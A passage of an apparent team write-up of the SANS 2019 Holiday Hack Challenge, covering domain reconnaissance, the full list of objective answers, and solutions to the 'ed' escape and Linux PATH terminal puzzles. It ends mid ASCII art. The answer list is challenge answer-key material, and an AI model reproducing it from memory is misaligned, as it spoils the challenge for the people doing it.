<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SANS 2019 Holiday Hack Writeup</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="ESnet Security Team" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="css/all.css"/>
<link rel="stylesheet" type="text/css" href="css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="css/readtheorg.css"/>
<link rel="stylesheet" type="text/css" href="css/asciinema-player.css"/>
<link rel="stylesheet" type="text/css" href="css/custom.css"/>
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="js/custom.js"></script>
<script type="text/javascript" src="js/readtheorg.js"></script>
<script type="text/javascript" src="js/asciinema-player.js"></script>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2018 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2019 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orga0b6f5e">Intro</a></li>
<li><a href="#org305ebbe">Recon</a>
<ul>
<li><a href="#orgf425c40">elfu.org</a></li>
</ul>
</li>
<li><a href="#orgbc552e2">Answers</a></li>
<li><a href="#org0c812ef">Terminals &amp; Mini-Challenges</a>
<ul>
<li><a href="#org3fd2b4e">Escape Ed</a>
<ul>
<li><a href="#orgb5f7265">Background</a></li>
<li><a href="#org8b9a0da">Solution</a></li>
</ul>
</li>
<li><a href="#term_path">Linux Path</a>
<ul>
<li><a href="#orgcc2eeb1">Background</a></li>
<li><a href="#org0fef90c">Solution</a></li>
</ul>
</li>
<li><a href="#term_powershell">Xmas Cheer Laser</a>
<ul>
<li><a href="#org180486c">Background</a></li>
<li><a href="#org2b7ac35">Solution</a></li>
<li><a href="#term_iptables_root">Escalating to Root</a></li>
</ul>
</li>
<li><a href="#org3a2e8f3">Frosty Keypad</a>
<ul>
<li><a href="#orgd9df4d0">Background</a></li>
<li><a href="#orgea96dcf">Solution</a></li>
</ul>
</li>
<li><a href="#term_trail">Holiday Hack Trail</a>
<ul>
<li><a href="#orgffb9b76">Background</a></li>
<li><a href="#orged5aea6">Solution 0: Strategy Guide</a></li>
<li><a href="#orgc244c11">Solution 1 (Easy): Modifying query parameters</a></li>
<li><a href="#orge485c40">Solution 2 (Medium): Modifying POST parameters</a></li>
<li><a href="#term_trail_hard">Solution 3 (Hard): Bypassing the Hash</a></li>
</ul>
</li>
<li><a href="#org1eb79bf">Nyanshell</a>
<ul>
<li><a href="#orgfea7f39">Background</a></li>
<li><a href="#orgddedab2">Solution</a></li>
</ul>
</li>
<li><a href="#org3ac514e">Graylog</a>
<ul>
<li><a href="#orgc7934af">Background</a></li>
<li><a href="#orgfa70ec7">Solution</a></li>
</ul>
</li>
<li><a href="#orge800edf">Mongo Pilfer</a>
<ul>
<li><a href="#org4e6d7f8">Background</a></li>
<li><a href="#orgfb32ce3">Solution</a></li>
<li><a href="#term_mongo_root">Escalating to Root</a></li>
</ul>
</li>
<li><a href="#term_iptables">Smart Braces</a>
<ul>
<li><a href="#org1661e17">Background</a></li>
<li><a href="#orgab73a74">Solution</a></li>
</ul>
</li>
<li><a href="#org7e31be7">Zeek JSON Analysis</a>
<ul>
<li><a href="#org302c5f4">Background</a></li>
<li><a href="#org4a3a078">Solution</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orga017a31">Objectives</a>
<ul>
<li><a href="#obj0">0. Talk to Santa in the Quad</a>
<ul>
<li><a href="#org2199a2c">Solution</a></li>
</ul>
</li>
<li><a href="#obj1">1. Find the Turtle Doves</a>
<ul>
<li><a href="#org2acfc8e">Solution</a></li>
</ul>
</li>
<li><a href="#obj2">2. Unredact Threatening Document 🎄</a>
<ul>
<li><a href="#org44675bd">Solution</a></li>
</ul>
</li>
<li><a href="#org1381e4e">3. Windows Log Analysis: Evaluate Attack Outcome 🎄</a>
<ul>
<li><a href="#org464c527">Background</a></li>
<li><a href="#orgdb3de2b">Solution</a></li>
</ul>
</li>
<li><a href="#obj4">4. Windows Log Analysis: Determine Attacker Technique 🎄🎄</a>
<ul>
<li><a href="#org164627c">Background</a></li>
<li><a href="#org6737c71">Solution</a></li>
</ul>
</li>
<li><a href="#obj5">5. Network Log Analysis: Determine Compromised System 🎄🎄</a>
<ul>
<li><a href="#org7666630">Background</a></li>
<li><a href="#org3af536c">Solution</a></li>
</ul>
</li>
<li><a href="#obj6">6. Splunk 🎄🎄🎄</a>
<ul>
<li><a href="#orgaf1d3f9">Background</a></li>
<li><a href="#orgd528856">Training Question Solutions</a></li>
<li><a href="#org55185b2">Challenge Question Solution</a></li>
</ul>
</li>
<li><a href="#obj7">7. Get Access To The Steam Tunnels 🎄🎄🎄</a>
<ul>
<li><a href="#org6cab035">Background</a></li>
<li><a href="#krampus">Solution</a></li>
</ul>
</li>
<li><a href="#obj8">8. Bypassing the Frido Sleigh CAPTEHA 🎄🎄🎄</a>
<ul>
<li><a href="#org5f60a68">Background</a></li>
<li><a href="#org39a3e67">Solution</a></li>
</ul>
</li>
<li><a href="#obj9">9. Retrieve Scraps of Paper from Server 🎄🎄🎄🎄</a>
<ul>
<li><a href="#orgc1d7428">Background</a></li>
<li><a href="#org6e2b1e0">Solution</a></li>
<li><a href="#org4a3f266">SQLMAP</a></li>
<li><a href="#org690460a">Extracting the Database</a></li>
</ul>
</li>
<li><a href="#obj10">10. Recover Cleartext Document 🎄🎄🎄🎄🎄</a>
<ul>
<li><a href="#org2b7c591">Background</a></li>
<li><a href="#orgb34711c">Solution</a></li>
<li><a href="#org92fac12">IDA Setup</a></li>
<li><a href="#orga9c01b2">Generate Key Function</a></li>
<li><a href="#org819490f">Super Secure Random Function</a></li>
<li><a href="#org365fc72">Determining the Cipher</a></li>
<li><a href="#orgaf03051">Validating the Key</a></li>
<li><a href="#post_decryption">Post-decryption</a></li>
</ul>
</li>
<li><a href="#obj11">11. Open the Sleigh Shop Door 🎄🎄🎄🎄🎄</a>
<ul>
<li><a href="#org75c56e1">Background</a></li>
<li><a href="#org1d9802a">Solution</a></li>
<li><a href="#orgdd77782">Automating the Solution: &lt; 1s</a></li>
<li><a href="#org7d19d85">Improving our Speed: &lt;100 ms</a></li>
<li><a href="#term_crate_score">Cheating to Achieve 7ms</a></li>
<li><a href="#term_crate_cracking">Bonus: Cracking the Code</a></li>
</ul>
</li>
<li><a href="#obj12">12. Filter Out Poisoned Sources of Weather Data 🎄🎄🎄🎄</a>
<ul>
<li><a href="#org043a4fc">Background</a></li>
<li><a href="#orgf7427b1">Solution</a></li>
<li><a href="#org774f714">Local File Inclusion (LFI)</a></li>
<li><a href="#orgca41a14">Cross-Site Scripting (XSS)</a></li>
<li><a href="#org0178955">Shellshock</a></li>
<li><a href="#orgb4401b7">SQL Injection (SQLi)</a></li>
<li><a href="#orgeaa085e">Pivoting on Other Fields</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgbc0b46f">KringleCon</a>
<ul>
<li><a href="#org5000f7f">The Campus</a>
<ul>
<li><a href="#orgc13ab5a">Interacting with the Game</a></li>
<li><a href="#jason">Finding Jason</a></li>
<li><a href="#maps">Maps</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#easter_eggs">Easter Eggs</a></li>
<li><a href="#orgb4e1350">Conclusion</a></li>
</ul>
</div>
</div>
<div id="outline-container-orga0b6f5e" class="outline-2">
<h2 id="orga0b6f5e">Intro</h2>
<div class="outline-text-2" id="text-orga0b6f5e">
<p>
Santa once again brought us one of our favorite presents this year;
another call to arms to help save Christmas from evil hackers. We were
more than willing to ignore family, friends, and real life
responsibilities in order to help out!
</p>

<p>
The main role <a href="https://www.es.net/about/">ESnet</a> plays is to connect the Department of Energy labs
together with bleeding-edge, low latency, high bandwidth links to help
push the boundaries of science. Due to this, we were excited to see a
laser in the Laboratory. We also enjoyed the mix of
offensive challenges, and defensive ones as well, that was a nice
twist. We were delighted to see Zeek (né Bro) feature as much as it
did, given that it was created at the same lab ESnet is based out of
and we have a Zeek developer on our team. We had a blast and, as
always, want to thank SANS for putting this on.
</p>

<p>
We try to show how, and more importantly, explain <b>why</b> we did each
step of the challenges. While this makes for a long report, we hope
it's got something for everyone. Each terminal challenge has an
accompanying <a href="https://asciinema.org/">asciinema</a> recording. We chose this format because it
allows you to pause the "video" and copy commands directly. If you'd
like more detail about a particular command, we recommend pasting it
into <a href="https://explainshell.com">explainshell.com</a>.
</p>

<p>
On the other hand, if this is the 1,650,000th report you're reading,
allow us to point out the highlights:
</p>

<ul class="org-ul">
<li><a href="#term_mongo_root">escalations to root</a> on <a href="#term_iptables_root">two Cranberry Pi terminals</a>,</li>
<li>HHC Trail <a href="#term_trail_hard">high score</a>, Crate <a href="#term_crate_score">low score</a>, and even <a href="#term_crate_cracking">cracking the Crate</a>,</li>
<li><a href="#jason">finding Jason</a> (twice!), cool <a href="#maps">maps</a> and some other <a href="#easter_eggs">easter eggs</a>.</li>
</ul>

<p>
Our motto is "why do things by hand when you can create a tool?" so
once again we’re also releasing some of the tools and scripts we wrote
in our <a href="https://github.com/esnet/hhc19">GitHub repository</a>.
</p>

<p>
Happy reading,
</p>

<p>
The ESnet Security Team
</p>

<p>
–Dop, Sam, and Vlad
</p>
</div>
</div>
<div id="outline-container-org305ebbe" class="outline-2">
<h2 id="org305ebbe">Recon</h2>
<div class="outline-text-2" id="text-org305ebbe">
<p>
The Holiday Hack Challenge is one of the most elaborate network
security competitions (and KringleCon is the largest online security
conference!). The complex architecture allows for challenges which are
incredibly realistic, and that can scale to tens of thousands of
competitors. However, complexity can often be the enemy of
security. Just like a real attacker targeting a real organization or
individual, the work begins long before the attack, during the
reconnaisance phase. Members of our team have done <abbr title="Holiday
Hack Challenge"> HHC</abbr> Recon the past few years with great
success. Even knowing a hostname or two can be a huge help.
</p>

<div class="warning">
<p>
Without any scope or authorization, you must not attack or affect the infrastructure during reconnaisance.
</p>

</div>

<p>
For more details, check out <a href="https://ncsa.github.io/sans-holiday-hack-2017/#recon">past</a> <a href="https://www.holidayhackchallenge.com/2018/winners/esnet_hhc18/#recon">write-ups</a>. Using reverse
WHOIS, we discover a new domain name, <code>wey-tech.com</code>, registered in
January 2019. This could be a red herring, though&#x2026;
</p>
</div>

<div id="outline-container-orgf425c40" class="outline-3">
<h3 id="orgf425c40">elfu.org</h3>
<div class="outline-text-3" id="text-orgf425c40">
<p>
Apart from searching for new domains, we've also been keeping an eye
on changes to domains we already know about. Looking at certificate
transparency logs once again, we find <a href="https://transparencyreport.google.com/https/certificates/FP0EJUjuLAPBcWgCUrDnDlM5ezgrXX8X8Y5RNmfju8k=">a certificate</a> with 2 <abbr title="Subject
Alternate Name"> SAN</abbr>s: <code>download.holidayhackchallenge.com</code>, which
was used in <abbr title="Holiday Hack Challenge"> HHC</abbr>18, and <code>downloads.elfu.org</code>.
</p>


<div class="figure">
<p><img src="./imgs/0_recon/1_elfu_ct_log.png" alt="1_elfu_ct_log.png" />
</p>
<p><span class="figure-number">Figure 1: </span>downloads.elfu.org in CT logs</p>
</div>


<p>
Checking WHOIS data for <code>elfu.org</code> we see that it was created in
May 2019. We also notice that our reverse WHOIS technique was thwarted
via WHOIS privacy.
</p>

<p>
<code>download.elfu.org</code> resolves to the same IP address as
<code>download.holidayhackchallenge.com</code>.
</p>

<p>
Our guess that this is "Elf University" is strengthened by Ed's tweet, with interesting capitalization:
</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Walking around ElfU tonight seeing all the preparations for <a href="https://twitter.com/KringleCon?ref_src=twsrc%5Etfw">@KringleCon</a> and SANS <a href="https://twitter.com/hashtag/HolidayHack?src=hash&amp;ref_src=twsrc%5Etfw">#HolidayHack</a>. The music surrounding me is AMAZING. <a href="https://twitter.com/CountNinjula?ref_src=twsrc%5Etfw">@CountNinjula</a> <a href="https://twitter.com/dualcoremusic?ref_src=twsrc%5Etfw">@dualcoremusic</a> THANK YOU!</p>&mdash; edskoudis (@edskoudis) <a href="https://twitter.com/edskoudis/status/1203118868350275584?ref_src=twsrc%5Etfw">December 7, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</div>
</div>
</div>

<div id="outline-container-orgbc552e2" class="outline-2">
<h2 id="orgbc552e2">Answers</h2>
<div class="outline-text-2" id="text-orgbc552e2">
<ol class="org-ol">
<li value="0"><p>
Talk to Santa in the Quad
</p>

<p>
<b>Santa was also in the Quad, you guys! (With an umbrella&#x2026;)</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="1"><p>
Find the Turtle Doves
</p>

<p>
<b>By the fireplace in the Student Union.</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="2"><p>
Unredact Threatening Document
</p>

<p>
<b>DEMAND</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="3"><p>
Windows Log Analysis: Evaluate Attack Outcome
</p>

<p>
<b>supatree</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="4"><p>
Windows Log Analysis: Determine Attacker Technique
</p>

<p>
<b>ntdsutil</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="5"><p>
Network Log Analysis: Determine Compromised System
</p>

<p>
<b>192.168.134.130</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="6"><p>
Splunk
</p>

<p>
<b>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="7"><p>
Get Access To The Steam Tunnels
</p>

<p>
<b>Krampus Hollyfeld</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="8"><p>
Bypassing the Frido Sleigh CAPTEHA
</p>

<p>
<b>8Ia8LiZEwvyZr2WO</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="9"><p>
Retrieve Scraps of Paper from Server
</p>

<p>
<b>Super Sled-O-Matic</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="10"><p>
Recover Cleartext Document
</p>

<p>
<b>Machine Learning Sleigh Router Finder</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="11"><p>
Open the Sleigh Shop Door
</p>

<p>
<b>The Tooth Fairy</b>
</p></li>
</ol>


<ol class="org-ol">
<li value="12"><p>
Filter Out Poisoned Sources of Weather Data
</p>

<p>
<b>0807198508261964</b>
</p></li>
</ol>
</div>
</div>

<div id="outline-container-org0c812ef" class="outline-2">
<h2 id="org0c812ef">Terminals &amp; Mini-Challenges</h2>
<div class="outline-text-2" id="text-org0c812ef">
</div>
<div id="outline-container-org3fd2b4e" class="outline-3">
<h3 id="org3fd2b4e">Escape Ed</h3>
<div class="outline-text-3" id="text-org3fd2b4e">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=edescape&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=edescape</a>
</p>

<p>
In the train station.
</p>
</div>

<div id="outline-container-orgb5f7265" class="outline-4">
<h4 id="orgb5f7265">Background</h4>
<div class="outline-text-4" id="text-orgb5f7265">
<pre class="example">
Oh, many UNIX tools grow old, but this one's showing gray.
That Pepper LOLs and rolls her eyes, sends mocking looks my way.
I need to exit, run - get out! - and celebrate the yule.
Your challenge is to help this elf escape this blasted tool.

-Bushy Evergreen
</pre>

<div class="goal">
<p>
Exit ed.
</p>

</div>

<div class="chat">
<p>
I'm glad you're here. I'm the target of a terrible trick.
</p>

<p>
Pepper Minstix is at it again, sticking me in a text editor.
</p>

<p>
Pepper is forcing me to learn ed.
</p>

<p>
Even the hint is ugly. Why can't I just use Gedit?
</p>

<p>
Please help me just quit the grinchy thing.
</p>

</div>

<div class="gamehint">
<p>
ed Editor Basics: <a href="http://cs.wellesley.edu/~cs249/Resources/ed_is_the_standard_text_editor.html">Ed Is The Standard Text Editor</a>
</p>

</div>
</div>
</div>

<div id="outline-container-org8b9a0da" class="outline-4">
<h4 id="org8b9a0da">Solution</h4>
<div class="outline-text-4" id="text-org8b9a0da">
<p>
<asciinema-player src="casts/edescape.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
We must escape the <code>ed</code> editor. This is reminiscent of last year's
<a href="https://www.holidayhackchallenge.com/2018/winners/esnet_hhc18/#org5097b5d">Essential Editor</a> challenge, where we had to escape <code>vi</code>. vi is actually a <a href="http://www.linfo.org/vi/history.html">descendant</a> of ed.
</p>

<p>
The website from hint has some useful advice for us:
</p>

<blockquote>
<p>
End all commands with an &lt;enter&gt;
</p>

<p>
When done editing, give the command "w", then "q". 
</p>
</blockquote>

<p>
Following the instructions in the hint, we manage to escape:
</p>

<pre class="example">
1100
w
1100
q
Loading, please wait......



You did it! Congratulations!
</pre>

<p>
Consulting the <code>ed</code> <a href="https://linux.die.net/man/1/ed">man page</a>, we determine that this issued the
"write" (save) command, followed by the "quit" command. We could've
combined these into a single <code>wq</code> command, or just quit immediately if
we didn't care about potential changes.
</p>
</div>
</div>
</div>
<div id="outline-container-org46e0922" class="outline-3">
<h3 id="term_path"><a id="org46e0922"></a>Linux Path</h3>
<div class="outline-text-3" id="text-term_path">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=path&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=path</a>
</p>

<p>
In Hermey Hall.
</p>
</div>

<div id="outline-container-orgcc2eeb1" class="outline-4">
<h4 id="orgcc2eeb1">Background</h4>
<div class="outline-text-4" id="text-orgcc2eeb1">
<pre class="src">
I need to list <span class="green">files</span> in my <span class="green">home/</span>
To check on project logos
But what I see with <span class="green">ls</span> there,
Are quotes from desert hobos...

<span class="green">which</span> piece of my command does fail?
I surely cannot <span class="green">find</span> it.
Make straight my <span class="green">path</span> and <span class="green">locate</span> that-
I'll praise your skill and sharp wit!

Get a listing (ls) of your current directory.
</pre>

<div class="goal">
<p>
Find and run the real <code>ls</code>.
</p>

</div>

<div class="chat">
<p>
I need to review some files in my Linux terminal, but I can't get a file listing.
</p>

<p>
I know the command is <code>ls</code>, but it's really acting up.
</p>

<p>
Do you think you could help me out? As you work on this, think about these questions:
</p>

<p>
<i>1. Do the words in green have special significance?</i><br />
<i>2. How can I find a file with a specific name?</i><br />
<i>3. What happens if there are multiple executables with the same name in my $PATH?</i>
</p>

</div>

<div class="gamehint">
<p>
Linux Path: Green words matter, files must be found, and the terminal's $PATH matters.
</p>

</div>
</div>
</div>

<div id="outline-container-org0fef90c" class="outline-4">
<h4 id="org0fef90c">Solution</h4>
<div class="outline-text-4" id="text-org0fef90c">
<p>
<asciinema-player src="casts/path.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
To find a file with a specific name, several words in green would
work: <code>which</code>, <code>find</code>, and <code>locate</code>. We'll use <code>which</code>, as it takes
the <code>PATH</code> environment variable into account. We'll invoke it with the
<code>-a</code> flag to list all instances, and not just the first one. If
duplicate files exist, the order the directory appears in the <code>PATH</code>
will determine which command gets run.
</p>

<pre class="src">
<span class="gray1">elf@term_path:~$</span> <span class="green">which</span> -<span class="purple">a</span> ls
/usr/local/bin/ls
/bin/ls
<span class="gray1">elf@term_path:~$</span> <span class="green">/bin/ls</span>
<span class="green">' '</span>   rejected-elfu-logos.txt
Loading, please wait......

You did it! Congratulations!
</pre>

<p>
We discover that the real <code>ls</code> is actually <code>/bin/darealmvp</code>. Running that, we're treated to some lovely hidden artwork:
</p>

<pre class="src">
<span class="gray1">elf@d561ee2abb68:~$</span> <span class="green">darealmvp</span> -<span class="purple">la</span>
total 52
drwxr-xr-x 1 elf  elf   4096 Dec  8 14:19 <span class="green">' '</span>
drwxr-xr-x 1 elf  elf   4096 Dec  8 14:19  <span class="green">.</span>
drwxr-xr-x 1 root root  4096 Nov 21 19:46  <span class="green">..</span>
-rw-r--r-- 1 elf  elf    220 Apr 18  2019  .bash_logout
-rw-r--r-- 1 elf  elf   3596 Jan  5 04:17  .bashrc
-rw-r--r-- 1 elf  elf  13838 Nov 21 19:46  .elfscream.txt
-rw-r--r-- 1 elf  elf    807 Apr 18  2019  .profile
-rw-r--r-- 1 elf  elf    401 Nov 21 19:46  rejected-elfu-logos.txt
<span class="gray1">elf@d561ee2abb68:~$</span> <span class="green">cat</span> .elfscream.txt 
I'm trapped in an ASCII art factory - send help!

XXXXKKKKKKKKKKKKKKKKKKKKK00000000000000000000000000OOO
XXXKKKKKKKKKKKKKKKKKKK0000000000000000000000000000000O
XXKKKKKKKKKKKKKKKK00000000000000000OOOOOOOOOOOO0OOOOOO
XXKKKKKKKKKKKKK0000000OOO<span class="red">kkkkkkxxxxxxxxkk</span>OOOOOOOOOOOOO
XKKKKKKKKKKK000OO<span class="red">kkxxxxxxxxxxkxddxxddddddodx</span>kOOOOOOOOO
KKKKKKKKK00O<span class="red">kxxxxxxxxxxdxxxxddxxxdddxdddddddoox</span>OOOOOOO
KKKKKKK0O<span class="red">kxxdxxkxxxxkxxxxxxdxxdddddxdddddoooooox</span>OOOOOO
KKKKK0<span class="red">Okkkxxxxkkxxxxxxxxxddxxxxxxxxxddddddoooooo</span>kOOOOO
